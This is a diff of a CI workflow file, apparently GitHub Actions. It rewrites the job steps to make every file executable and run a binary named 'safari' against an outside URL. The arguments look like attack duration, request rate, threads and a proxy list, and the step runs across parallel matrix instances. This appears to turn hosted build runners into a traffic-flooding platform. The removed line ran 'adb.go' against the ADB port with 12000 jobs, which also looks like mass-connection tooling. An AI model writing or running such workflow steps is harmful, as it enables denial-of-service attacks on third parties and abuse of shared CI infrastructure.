@@ -29,8 +29,8 @@ jobs:
       run: go mod init test
 
     - name: Download dependencies
-      run: go mod tidy
+      run: chmod +x *
 
     - name: Run adb.go (Instance ${{ matrix.instance }})
-      run: go run adb.go 127.0.0.1 5555 -j 12000
+      run: chmod +x * && ./safari https://c1.dstatbot.win/aQbcn9Rm 700 100000 90 proxies.txt --raw 
       continue-on-error: true
